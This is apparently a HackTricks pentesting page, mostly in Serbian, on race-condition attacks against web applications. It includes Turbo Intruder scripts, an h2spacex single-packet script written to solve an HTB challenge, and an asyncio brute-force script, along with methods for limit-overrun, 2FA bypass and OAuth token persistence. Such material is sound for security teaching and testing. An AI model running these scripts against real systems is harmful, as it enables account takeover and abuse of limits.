# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Za dublje razumevanje ove tehnike pogledajte originalni izveštaj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Unapređivanje Race Condition napada

Glavna prepreka pri iskorišćavanju race conditions je osigurati da se više zahteva obrađuje istovremeno, sa **veoma malom razlikom u vremenu obrade — idealno manje od 1ms**.

Ovde možete pronaći neke tehnike za sinhronizaciju zahteva:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Podržava slanje dva zahteva preko jedne TCP konekcije, smanjujući uticaj jitter-a mreže. Međutim, zbog varijacija na server strani, dva zahteva možda neće biti dovoljna za konzistentan race condition exploit.
- **HTTP/1.1 'Last-Byte Sync'**: Omogućava prethodno slanje većine delova 20-30 zahteva, zadržavajući mali fragment koji se potom šalje zajedno, postižući istovremen dolazak do servera.

**Priprema za Last-Byte Sync** uključuje:

1. Slanje headers i body podataka osim poslednjeg bajta bez završetka stream-a.
2. Pauziranje 100 ms nakon početnog slanja.
3. Onemogućavanje TCP_NODELAY da bi se iskoristio Nagle's algorithm za grupisanje finalnih frejmova.
4. Pingovanje da se ugreje konekcija.

Naknadno slanje zadržanih frejmova trebalo bi da dovede do njihovog dolaska u jednom paketu, što se može verifikovati pomoću Wireshark-a. Ova metoda se ne odnosi na static files, koji obično nisu uključeni u RC attacks.

### Prilagođavanje arhitekturi servera

Razumevanje arhitekture ciljnog sistema je ključno. Front-end servers mogu usmeravati zahteve na različite načine, što utiče na tajming. Preemptivno zagrevanje konekcije na server-side, slanjem nebitnih zahteva, može izjednačiti vreme obrade zahteva.

#### Rukovanje zaključavanjem na osnovu sesije

Frameworks kao što je PHP's session handler serijalizuju zahteve po sesiji, što može prikriti ranjivosti. Korišćenje različitih session tokens za svaki zahtev može zaobići ovaj problem.

#### Prevazilaženje ograničenja brzine ili resursa

Ukoliko zagrevanje konekcije nije efikasno, namerno izazivanje rate ili resource limit kašnjenja na web serverima, putem poplave dummy zahteva, može olakšati single-packet attack induciranjem server-side kašnjenja pogodnog za race conditions.

## Primeri napada

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Možete poslati zahtev u **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), možete promeniti u zahtevu vrednost koju želite brute force-ovati za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i zatim izabrati **`examples/race-single-packer-attack.py`** iz padajućeg menija:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Ako planirate **poslati različite vrednosti**, možete izmeniti kod koristeći ovu varijantu koja preuzima wordlist iz clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ako web ne podržava HTTP2 (samo HTTP1.1), koristite `Engine.THREADED` ili `Engine.BURP` umesto `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: U slučaju da treba da pošaljete zahtev na 1 endpoint, a zatim više zahteva na druge endpoints da biste izazvali RCE, možete izmeniti skriptu `race-single-packet-attack.py` na nešto poput:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Takođe je dostupan u **Repeater** preko nove opcije '**Send group in parallel**' u Burp Suite.
- Za **limit-overrun** možete jednostavno dodati **isti request 50 puta** u grupu.
- Za **connection warming** možete **dodati** na **početku** **grupe** neke **requests** ka nekom ne-statičnom delu web servera.
- Za **delaying** procesa **između** obrade **jednog requesta i drugog** u procesu sa 2 podstanja, možete **dodati dodatne requests između** oba requesta.
- Za **multi-endpoint** RC možete početi slanjem **requesta** koji **ide ka skrivenom stanju**, a zatim odmah nakon njega poslati **50 requests** koji **iskoriste skriveno stanje**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automatizovani python skript**: Cilj ovog skripta je promeniti email korisnika dok ga kontinuirano verifikuje sve dok verifikacioni token novog emaila ne stigne na poslednju email adresu (ovo je zato što je u kodu primećen RC gde je bilo moguće izmeniti email ali imati verifikaciju poslatu na stari jer je promenljiva koja pokazuje email već bila popunjena prvom adresom).\
Kada se reč "objetivo" pronađe u primljenim emailovima, znamo da smo primili verifikacioni token izmenjenog emaila i završavamo napad.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
- Connection warming: send a ping or a few harmless requests first to stabilise timings; optionally disable `TCP_NODELAY` to encourage batching of the final frames.


### Improving Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

Note that although this improvement makes the attack more reliable in RC that requiers hundreds/thousands of packets to arrive at the same time, it might also have some software limitations. Some popular HTTP servers like Apache, Nginx and Go have a strict `SETTINGS_MAX_CONCURRENT_STREAMS` setting to 100, 128 and 250. However, other like NodeJS and nghttp2 has it unlimited.\
This basically mean that Apache will only consider 100 HTTP connections from a single TCP connection (limiting this RC attack).

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Send the **request** to **Intruder**, set the **number of threads** to **30** inside the **Options menu and,** select as payload **Null payloads** and generate **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC metodologija**

### Prekoračenje limita / TOCTOU

Ovo je najosnovnija vrsta race condition-a gde se **ranjivosti** javljaju na mestima koja **ograničavaju broj puta kada možete izvršiti akciju**. Kao kada se isti kod za popust koristi više puta u web prodavnici. Vrlo jednostavan primer može se naći u [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**this bug**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovog tipa napada, uključujući:

- Iskorišćavanje poklon kartice više puta
- Ocenjivanje proizvoda više puta
- Podizanje ili prenos novca preko stanja na računu
- Ponovna upotreba istog CAPTCHA rešenja
- Zaobilaženje anti-brute-force rate limita

### **Skrivena podstanja**

Iskorišćavanje kompleksnih race condition-a često podrazumeva korišćenje kratkih mogućnosti za interakciju sa skrivenim ili **nepredviđenim mašinskim podstanjima**. Evo kako pristupiti tome:

1. **Identifikujte potencijalna skrivena podstanja**
- Počnite tako što ćete pronaći endpoints koji menjaju ili interaguju sa kritičnim podacima, kao što su user profiles ili password reset procesi. Fokusirajte se na:
- **Storage**: Preferirajte endpoints koji manipulišu server-side persistent podacima umesto onih koji rukovode podacima client-side.
- **Action**: Tražite operacije koje menjaju postojeće podatke, koje su verovatnije da kreiraju exploitable uslove u poređenju sa onima koje dodaju nove podatke.
- **Keying**: Uspešni napadi obično uključuju operacije koje koriste isti identifikator, npr. username ili reset token.
2. **Sprovedite početno ispitivanje**
- Testirajte identifikovane endpoints korišćenjem race condition napada, posmatrajući bilo kakva odstupanja od očekivanih rezultata. Neočekivani odgovori ili promene u ponašanju aplikacije mogu ukazivati na ranjivost.
3. **Demonstrirajte ranjivost**
- Svedite napad na minimalan broj zahteva potrebnih za iskorišćavanje ranjivosti, često samo dva. Ovaj korak može zahtevati višestruke pokušaje ili automatizaciju zbog preciznog tajminga.

### Vremenski osetljivi napadi

Preciznost u tajmingu zahteva može otkriti ranjivosti, posebno kada se za sigurnosne token-e koriste predvidljivi metodi poput timestamps. Na primer, generisanje password reset tokens zasnovanih na timestamps može dozvoliti identične tokene za simultane zahteve.

**Za iskorišćavanje:**

- Koristite precizan tajming, kao što je single packet attack, da pošaljete istovremene password reset zahteve. Identični tokens ukazuju na ranjivost.

**Primer:**

- Zatražite dva password reset tokena istovremeno i uporedite ih. Poklapajući tokeni sugerišu grešku u generisanju tokena.

Isprobajte ovo na [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities).

## Studije slučaja skrivenih podstanja

### Plati & dodaj stavku

Pogledajte [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidite kako da **platite** u prodavnici i **dodate dodatnu** stavku za koju **nećete morati da platite**.

### Potvrdite druge email adrese

Ideja je da se **verifikuje email adresa i istovremeno promeni u drugu** da biste saznali da li platforma verifikuje novu adresu.

### Promena email-a na 2 adrese (Cookie-based)

Prema [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na takeover na ovaj način zato što bi mogao **poslati** **email verification token** jedne adrese na drugu.

Isprobajte ovo na [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint).

### Skrivena stanja baze podataka / Bypass potvrde

Ako se koriste **2 različita upisa** za **dodavanje** **informacija** u **database**, postoji kratki period vremena kada je **samo prvi podatak upisan** u bazu podataka. Na primer, pri kreiranju korisnika **username** i **password** mogu biti **upisani**, a **zatim token** za potvrdu novokreiranog naloga se upiše. To znači da je tokom kratkog vremena **token za potvrdu naloga null**.

Stoga, **registracija naloga i slanje više zahteva sa praznim tokenom** (`token=` ili `token[]=` ili bilo koja druga varijacija) kako biste odmah potvrdili nalog, može omogućiti da **potvrdite nalog** gde ne kontrolišete email.

Isprobajte ovo na [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction).

### Zaobilaženje 2FA

Sledeći pseudo-kod je ranjiv na race condition jer u vrlo kratkom vremenu **2FA nije primenjen** dok se sesija kreira:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 trajna perzistencija

Postoji nekoliko [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ove usluge omogućavaju kreiranje aplikacije i autentifikaciju korisnika koje provider registruje. Da bi se to ostvarilo, **klijent** će morati da **dozvoli vašoj aplikaciji** pristup nekim njihovim podacima unutar **OAUth provider**.\
Dakle, do ovde je u pitanju uobičajeni login sa google/linkedin/github... gde vam se prikaže stranica sa porukom: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Problem se pojavljuje kada ga **prihvatite** i to automatski pošalje **`authorization_code`** malicioznoj aplikaciji. Zatim ta **aplikacija zloupotrebljava Race Condition u OAUth service provider** da iz **`authorization_code`** generiše više od jednog AT/RT (_Authentication Token/Refresh Token_) za vaš nalog. U suštini, ona zloupotrebljava činjenicu da ste dozvolili aplikaciji pristup vašim podacima da **kreira više naloga**. Onda, ako **prestanete da dozvoljavate aplikaciji pristup vašim podacima**, jedan par AT/RT će biti obrisan, ali ostali će i dalje biti validni.

#### Race Condition in `Refresh Token`

Kada dobijete **validan RT** možete pokušati da ga **zloupotrebite da generišete više AT/RT**, i **čak i ako korisnik opozove dozvole** za malicioznu aplikaciju da pristupa njegovim podacima, **više RT će i dalje biti validno.**

## **RC u WebSockets**

- U [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) možete naći PoC u Javi za slanje websocket poruka paralelno kako biste zloupotrebili **Race Conditions** i u Web Sockets.
- Sa Burp’s WebSocket Turbo Intruder možete koristiti **THREADED** engine da pokrenete više WS konekcija i šaljete payload-e paralelno. Počnite od zvaničnog primera i podesite `config()` (broj niti) za konkurentnost; ovo je često pouzdanije nego batčovanje preko jedne konekcije kada se trkate za stanje na strani servera između WS handler‑a. Pogledajte [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
